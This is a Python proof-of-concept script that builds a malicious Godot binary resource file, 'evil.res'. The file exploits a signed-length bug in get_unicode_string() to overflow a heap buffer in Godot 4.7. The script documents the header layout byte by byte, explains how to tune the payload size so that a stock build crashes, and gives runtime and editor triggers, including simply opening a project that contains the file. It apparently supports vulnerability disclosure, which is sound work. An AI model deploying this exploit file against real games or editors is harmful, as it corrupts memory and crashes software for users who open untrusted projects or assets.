#!/usr/bin/env python3
"""
Generate evil.res — a crafted Godot binary resource that triggers a heap buffer
overflow in ResourceLoaderBinary::get_unicode_string()
(core/io/resource_format_binary.cpp:864) on a stock Godot 4.7 build.

The bug: get_unicode_string() reads a 32-bit string length into a SIGNED int with
no masking. A length of 0x80000000 is negative, so the grow-check `len > str_buf.size()`
is false (the buffer is NOT resized), `len == 0` is also false, and then `len` is passed
as a uint64_t to get_buffer() where it sign-extends to ~0xFFFFFFFF80000000, causing
fread() to copy every remaining byte in the file into the under-sized heap buffer.

Header layout (all little-endian, big_endian=0):
  [+00]  4 B   magic           "RSRC"
  [+04]  u32   big_endian      0
  [+08]  u32   use_real64      0
  [+0C]  u32   ver_major       4
  [+10]  u32   ver_minor       7
  [+14]  u32   ver_format      6   (== FORMAT_VERSION; checked as <=)
  [+18]  u32   type_len        16  (get_unicode_string — sizes str_buf to 16)
  [+1C]  16 B  type_bytes      "Resource\x00\x00\x00\x00\x00\x00\x00\x00"
  [+2C]  u64   importmd_ofs    0
  [+34]  u32   flags           0   (no UIDS / SCRIPT_CLASS / NAMED_SCENE_IDS)
  [+38]  u64   uid_skip        0   (using_uids=false, always skipped)
  [+40]  11×u32 reserved       0×11 (RESERVED_FIELDS = 11)
  [+6C]  u32   string_table_sz 1
  [+70]  u32   mal_len         0x80000000  ← negative int, bypasses resize
  [+74]  N B   payload         attacker-controlled bytes that overflow the heap

Trigger A (runtime):  ResourceLoader.load("res://evil.res")  in an exported game
Trigger B (editor):   drop evil.res into a project and open it — EditorFileSystem
                      scans dependencies automatically, no GDScript needed
"""

import struct
import argparse
import sys
from pathlib import Path


def u32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


def u64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def make_evil_res(payload_size: int = 8 * 1024 * 1024) -> bytes:
    """
    Build the crafted .res file.

    payload_size: bytes after the malicious length field.

    For stock binaries without ASan/PageHeap the default is 8 MiB.  Why so
    large: the signed-len bug makes fread() write the entire file tail into a
    16-byte heap buffer.  In the Godot editor's large heap the adjacent pages
    are committed, so a 256 KiB overflow never reaches unmapped memory — it
    silently corrupts other heap allocations but fread() completes without
    faulting.  Additionally, String::utf8() is called with the same negative
    length; it falls through to strlen(), which walks past the overflow region
    and finds a null byte in the surviving heap, so the UTF-8 loop also
    completes without crashing.  8 MiB reliably crosses past all committed heap
    pages, so fread() itself faults on the first write to an uncommitted page.

    Under ASan or PageHeap even 4096 bytes triggers an immediate
    heap-buffer-overflow report at resource_format_binary.cpp:872.
    """
    parts = []

    # ── magic ──────────────────────────────────────────────────────────────────
    parts.append(b"RSRC")

    # ── endianness / format version ────────────────────────────────────────────
    parts.append(u32(0))   # big_endian = 0
    parts.append(u32(0))   # use_real64 = 0
    parts.append(u32(4))   # ver_major  = 4
    parts.append(u32(7))   # ver_minor  = 7
    parts.append(u32(6))   # ver_format = 6  (FORMAT_VERSION)

    # ── type string (first get_unicode_string call, line 968) ──────────────────
    # This benign call sizes str_buf to 16; the malicious call inherits that size.
    type_str = b"Resource\x00\x00\x00\x00\x00\x00\x00\x00"   # 16 bytes
    assert len(type_str) == 16
    parts.append(u32(16))
    parts.append(type_str)

    # ── post-type header fields ────────────────────────────────────────────────
    parts.append(u64(0))   # importmd_ofs
    parts.append(u32(0))   # flags (no UIDS, no SCRIPT_CLASS, no NAMED_SCENE_IDS)
    parts.append(u64(0))   # uid field (always consumed; using_uids=false → discarded)

    # RESERVED_FIELDS = 11
    for _ in range(11):
        parts.append(u32(0))

    # ── string table (lines 1001-1006) ─────────────────────────────────────────
    parts.append(u32(1))            # string_table_size = 1

    # Malicious entry: len field = 0x80000000
    #   As int32:  -2147483648  → resize check `len > str_buf.size()` is false
    #   As uint64: 0xFFFFFFFF80000000 → passed to fread as count, reads entire file tail
    parts.append(u32(0x80000000))   # malicious length
    parts.append(b"\xCC" * payload_size)   # payload — overwrites heap past str_buf[0..15]

    return b"".join(parts)


def main():
    ap = argparse.ArgumentParser(description="Generate evil.res for CVE-XXXX (get_unicode_string OOB write)")
    ap.add_argument("output", nargs="?", default="evil.res",
                    help="Output path (default: evil.res)")
    ap.add_argument("--payload-size", type=int, default=8 * 1024 * 1024,
                    help="Payload byte count after the malicious length field "
                         "(default: 8 MiB — large enough to fault on stock binary; "
                         "4096 is sufficient under ASan/PageHeap)")
    args = ap.parse_args()

    data = make_evil_res(args.payload_size)
    out = Path(args.output)
    out.write_bytes(data)
    print(f"Wrote {len(data):,} bytes to {out}")
    print(f"  str_buf capacity after type read : 16 bytes")
    print(f"  malicious len field              : 0x80000000  (-2147483648 as int32)")
    print(f"  sign-extended fread count        : 0xFFFFFFFF80000000")
    print(f"  payload size                     : {args.payload_size:,} bytes")
    print()
    print("Trigger A (runtime) : ResourceLoader.load(\"res://evil.res\")  in exported game")
    print("Trigger B (editor)  : copy evil.res into project folder, then open project — no GDScript needed")
    print()
    print("Note: if no crash is observed on a stock binary, the overflow is landing in")
    print("committed heap pages.  Use --payload-size 8388608 (8 MiB) to overflow past")
    print("them.  Under ASan/PageHeap even --payload-size 4096 crashes immediately.")


if __name__ == "__main__":
    main()
